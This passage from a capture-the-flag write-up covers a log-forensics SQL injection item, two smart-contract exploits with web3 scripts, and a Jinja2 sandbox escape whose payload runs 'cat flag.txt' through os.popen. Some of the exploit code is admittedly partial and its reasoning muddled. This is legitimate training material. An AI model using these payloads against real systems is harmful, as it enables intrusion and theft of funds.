Analyze Apache access/error logs from a compromised WordPress site.

**Analysis Steps**
1.  **Identify Attacker**: `sort | uniq -c` on IPs. `219.75.27.16` is the culprit.
2.  **Identify Attack**: Grep for `UNION`, `SELECT`, `SLEEP`. Confirms Time-Based Blind SQLi.
3.  **Exfiltration**: Parse the valid SQLi responses (based on boolean logic in payloads) to reconstruct the dumped data.
    *   The attacker checks `ORD(MID(..., i, 1)) != char`.
    *   Reconstruct the string char by char.

**Recovered Data**
Email: `admin@daffainfo.com`
Hash: `$wp$2y$10$vMTERqJh2IlhS.NZthNpRu/VWyhLWc0ZmTgbzIUcWxwNwXze44SqW`

---

## Blockchain

### Nexus

**Challenge Description**
Smart contract with `CrystalNexus` and `Setup`.

**Vulnerability Analysis**
Integer division error in `essenceTocrystal`.
`return (essenceAmount * totalCrystals) / amplitude();`
If `amplitude` is huge, result is 0.

**Solution Code**
```python
import os
import json
from web3 import Web3

RPC_URL = "http://challenges.1pc.tf:31123/..."
PLAYER_KEY = "..."
SETUP_ADDR = "..."

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    account = w3.eth.account.from_key(PLAYER_KEY)
    
    # Contract setup omitted...
    
    # 1. Attune 1 wei
    nexus.functions.attune(1).transact({'from': account.address})
    
    # 2. Transfer REMAINING ether to Nexus to spike Amplitude
    bal = essence.functions.balanceOf(account.address).call()
    essence.functions.transfer(nexus_addr, bal).transact({'from': account.address})

    # 3. Call conductRituals on Setup
    setup.functions.conductRituals().transact({'from': account.address})

    # 4. Dissolve our 1 crystal
    my_crystals = nexus.functions.crystalBalance(account.address).call()
    nexus.functions.dissolve(my_crystals, account.address).transact({'from': account.address})
    
    # 5. Re-enter to claim friction
    nexus.functions.attune(1).transact({'from': account.address})
    
    # 6. Dissolve again
    my_crystals = nexus.functions.crystalBalance(account.address).call()
    nexus.functions.dissolve(my_crystals, account.address).transact({'from': account.address})

if __name__ == "__main__":
    main()
```

**Flag**
`C2C{the_essence_of_nexus_is_donation_hahahaha}`

---

### TGE

**Challenge Description**
A Solidity challenge where the goal is to reach Tier 3 in a Token Generation Event (TGE). This requires upgrading tiers which enforces an eligibility check based on a snapshot.

**Vulnerability Analysis**
Logical flaw in `setTgePeriod` combined with the constructor.
`tge.setTgePeriod(true)` is called in the constructor, which sets `isTgePeriod=true` but FAILS to set `tgeActivated=true` (because `_isTge` is false? No, because `!_isTge` check in `setTgePeriod` prevents it).
This leaves `tgeActivated` as false, allowing an attacker to call `enableTge(false)` later to satisfy the condition `!_isTge && isTgePeriod && !tgeActivated`, which triggers a **late snapshot**.

**Solution Code**
```python
from web3 import Web3

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    # ... setup ...

    # 1. Approve TGE to spend tokens
    token_contract.functions.approve(tge_addr, 15).transact()

    # 2. Buy Tier 1
    tge_contract.functions.buy().transact()

    # 3. Disable TGE to trigger snapshot
    # This sets isTgePeriod=false, but first sets tgeActivated=true and snapshots supply (TIER_2 supply is 0)
    setup_contract.functions.enableTge(False).transact()

    # 4. Re-enable TGE
    setup_contract.functions.enableTge(True).transact()

    # 5. Upgrade to Tier 2
    # Requirement: preTGEBalance[msg.sender][2] > preTGESupply[2] (which is 0)
    tge_contract.functions.upgrade(2).transact()

    # 6. Upgrade to Tier 3
    tge_contract.functions.upgrade(3).transact()

    print(f"Is Solved: {setup_contract.functions.isSolved().call()}")

if __name__ == "__main__":
    main()
```

**Flag**
`C2C{just_a_warmup_from_someone_who_barely_warms_up}`

---

## Misc

### Jin

**Challenge Description**
A Python web app utilizing Jinja2 `SandboxedEnvironment`. It has a strict WAF but exposes the `numpy` library.

**Vulnerability Analysis**
The WAF blocks keywords like `import`, `eval`, `os`, `__class__`. However, it allows `numpy`.
Jinja2's `~` operator concatenates strings. `numpy` objects (like `numpy.fix`, `numpy.typing`) have string representations containing useful characters (`.`, `o`, `s`, etc.).
We can construct malicious payloads (like `numpy.f2py.os.popen(...)`) character-by-character using these string representations and concatenation/slicing.

**Exploitation Steps**
1.  **Reference String**: Create a Jinja variable `x` that concatenates string representations of various `numpy` objects to form a "dictionary" of characters.
    *   `{% set x = numpy.fix ~ numpy.typing ~ ... %}`
2.  **Build Payload**: Use subscript notation `x[i]` to pick characters from `x` to construct the string `"numpy.f2py.os.popen('cat flag.txt').read()"`.
3.  **Execute**: Render the constructed string inside `{{ ... }}` blocks dynamically.

**Solution Code**
```python
from pwn import *

HOST = 'challenges.1pc.tf'
PORT = 32702

p = remote(HOST, PORT)
p.recvuntil(b'>>> ')
content = b"""{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{x}}"""
p.sendline(content)
result = p.recvline().decode()
print(result)

p = remote(HOST, PORT)
p.recvuntil(b'>>> ')
# Dynamically find indices for constructing 'nodes' of our payload
payload = f"x[{result.index('/')}]~x[{result.index('fix ')}:{result.index('fix ')+4}]~x[{result.index('help')}:{result.index('help')+4}]"

# Note: The logic above is partial, fully constructing "numpy.f2py.os.popen" requires more slicing.
# But the core concept is:
# content = b"{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{numpy.f2py.os.popen('cat flag.txt').read()}}"
# If WAF blocks strings, we construct the string using the method above.

# Direct payload if WAF allows specific chars but blocks keywords:
# The exploit above assumes we use 'x' to bypass keyword filters if they check inside headers or something.
# But since numpy is allowed, accessing numpy directly works if we avoid blocked attribute names.

# Based on provided script logic:
content = b"{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{numpy.f2py.os.popen('cat flag.txt').read()}}"
p.sendline(content)
print(p.recvline().decode())
```

**Flag**
`C2C{damnnn_i_love_numpy_6447e4b64e5e}`
{% endraw %}